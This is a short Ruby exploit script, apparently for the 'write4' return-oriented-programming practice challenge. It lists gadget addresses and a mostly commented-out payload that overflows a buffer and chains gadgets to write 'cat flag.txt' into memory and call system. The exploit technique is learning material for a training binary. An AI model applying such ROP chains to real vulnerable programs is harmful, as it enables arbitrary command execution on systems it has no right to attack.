require 'pwn'

pop_pop_ret_address = 0x400890 #0x0000000000400890 : pop r14 ; pop r15 ; ret
write_address       = 0x601050
mov_address         = 0x400820 #mov qword ptr [r14], r15 ; ret
system_address      = 0x4005E0 
pop_rdi_ret_address = 0x400893

#p = Tubes::Process.new('./write4', out: :pty)
elf = ELF.new("./write4")
rop = ROP(elf)
#payload = flat(["A"*40, p64(pop_pop_ret_address), p64(write_address),"cat fla\x00",p64(mov_address),p64(pop_pop_ret_address),p64(write_address + 7),"g.txt\x00\x00\x00",p64(mov_address) ,p64(pop_rdi_ret_address),p64(write_address),p64(system_address)])
#print payload
#file = File.open('payload64','w')
#file.write(payload)
#p.write payload
#p.sendline(payload)
#p.interact

